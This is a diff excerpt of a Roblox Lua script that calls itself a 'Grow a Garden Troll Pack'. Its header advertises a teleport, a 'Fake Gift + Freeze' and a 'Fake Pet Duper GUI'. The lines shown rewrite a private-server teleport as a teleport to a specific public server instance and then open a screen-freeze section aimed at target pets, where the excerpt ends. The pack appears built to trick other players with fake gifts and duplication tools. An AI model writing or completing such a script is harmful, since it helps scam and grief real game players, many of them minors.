@@ -1,16 +1,16 @@
 -- 📦 COMBINED SCRIPT: Grow a Garden Troll Pack by Arjun
 -- Includes: Teleport, Fake Gift + Freeze, Fake Pet Duper GUI
 
---🔁 TELEPORT TO PRIVATE SERVER
+-- 🔁 TELEPORT TO PUBLIC SERVER
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 
-local placeId = 9872472334
-local accessCode = "Ofe98fa9-cfdc-4281-bb9a-fd4039676e98" -- << Replace this if needed
+local placeId = 9872472334 -- The place ID
+local jobId = "Ofe98fa9-cfdc-4281-bb9a-fd4039676e98" -- Public server job ID, replace if needed
 
-TeleportService:TeleportToPrivateServer(placeId, accessCode, {player})
+TeleportService:TeleportToPlaceInstance(placeId, jobId, {player})
 
 -- 🎁 FREEZE SCREEN
 local targetPets = {
